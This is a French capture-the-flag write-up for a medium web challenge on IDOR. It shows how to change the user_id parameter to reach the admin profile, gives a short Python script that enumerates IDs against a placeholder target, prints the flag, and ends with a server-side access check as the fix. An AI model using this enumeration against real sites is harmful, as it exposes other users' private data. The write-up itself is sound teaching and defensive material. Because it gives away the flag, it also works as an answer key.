# Writeup — IDOR Profile

**Catégorie** : Web  
**Difficulté** : Medium  
**Points** : 200  
**Flag** : `CTF{idor_user_enumeration_owned}`

## Contexte

L'IDOR (Insecure Direct Object Reference) se produit quand une application utilise un identifiant contrôlable par l'utilisateur pour accéder à des ressources sans vérifier les droits d'accès.

## Étapes de résolution

### 1. Observer l'URL

En arrivant sur le site, on est redirigé vers :
```
/profile?user_id=<ID_ALÉATOIRE>
```
Notre ID est entre 50 et 999.

### 2. Tenter l'énumération

Modifier le paramètre `user_id` dans l'URL :
```
/profile?user_id=1
```

### 3. Accès au profil admin

L'ID 1 correspond à l'administrateur. Le flag s'affiche sur son profil.

```
CTF{idor_user_enumeration_owned}
```

## Script de scan

```python
import requests

base = "http://TARGET:5033"
s = requests.Session()
s.get(base)  # initialize session

for uid in range(1, 10):
    r = s.get(f"{base}/profile?user_id={uid}")
    if "CTF{" in r.text:
        print(f"[+] Flag found at user_id={uid}")
        break
```

## Correction

Vérifier côté serveur que l'utilisateur connecté est bien propriétaire de la ressource demandée :
```python
if uid != session["uid"] and not is_admin(session["uid"]):
    return "Forbidden", 403
```
